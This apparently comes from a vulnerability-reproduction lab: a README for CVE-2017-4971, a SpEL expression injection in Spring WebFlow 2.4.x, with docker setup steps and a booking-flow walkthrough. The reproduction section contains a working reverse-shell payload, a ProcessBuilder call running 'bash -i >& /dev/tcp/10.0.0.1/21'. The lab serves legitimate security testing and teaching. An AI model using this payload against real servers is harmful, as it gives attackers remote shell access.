# Spring WebFlow Remote Code Execution (CVE-2017-4971)

[中文版本(Chinese version)](README.zh-cn.md)

Spring WebFlow is a framework suitable for developing flow-based applications (such as shopping logic), which can separate the flow definition from the classes and views that implement the flow behavior. In its 2.4.x versions, if we can control the field during data binding, it will lead to a SpEL expression injection vulnerability, ultimately resulting in arbitrary command execution.

Reference links:

- https://threathunter.org/topic/593d562353ab369c55425a90
- https://pivotal.io/security/cve-2017-4971

## Environment Setup

Execute the following command to start the a web application based on Spring WebFlow 2.4.4:

```
docker compose up -d
```

After the server starts, visit `http://your-ip:8080` to see a hotel booking page, which is a simple example provided by Spring WebFlow.

## Vulnerability Reproduce

First, visit `http://your-ip:8080/login` and log in to the system using any of the accounts/passwords given on the left side of the page:

![](1.png)

Then visit the hotel with id 1 at `http://your-ip:8080/hotels/1`, click the "Book Hotel" button, fill in the relevant information, and click "Process" (from this step, WebFlow officially begins):

![](2.png)

Then click "Confirm":

![](3.png)

At this point, intercept the request and capture a POST data packet. We add a field to it (which is the reverse shell POC):

```
_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/10.0.0.1/21 0>&1")).start()=vulhub
```

![](4.png)

(Note: Don't forget to URL encode)

Successfully executed, gaining shell access:

![](5.png)
